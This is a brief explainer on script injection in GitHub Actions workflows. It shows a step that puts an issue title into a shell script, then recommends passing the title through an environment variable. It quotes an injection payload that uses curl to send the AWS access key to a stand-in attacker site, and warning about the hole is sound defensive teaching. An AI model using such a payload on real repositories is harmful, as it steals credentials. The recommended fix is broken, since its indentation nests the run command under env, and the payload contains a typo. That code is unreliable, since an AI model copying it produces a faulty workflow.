# Security and Permissions


```yaml
 - name: Assign label
   run: |
      issue_title="${{ github.event.issue.title }}"
      if [[ "$issue_title" == *"bug"* ]]; then
      echo "Issue is about a bug!"
      else
      echo "Issue is not about a bug"
      fi
```


This code is vulnerable to script injection.
Formally, a malicious agent could do something like this:

`a";curl http;//my-bad-site.com?abc=$AWS_ACCESS_KEY_ID`

and gain access to sensitive data, like the aws_access_key_id, which 
generally is stored in a repository secret.

The first way that comes to mind to avoid this 
situation is using a github actions, because the injection would never reach a shell.

If you must use your own comand is better to use an environment variable to store
your title.

```yaml
- name: Assign label
    env: 
      TITLE: ${{ github.event.issue.title }}
        run: |
          if [[ "$TITLE" == *"bug"* ]]; then
          echo "Issue is about a bug!"
          else
          echo "Issue is not about a bug"
          fi
```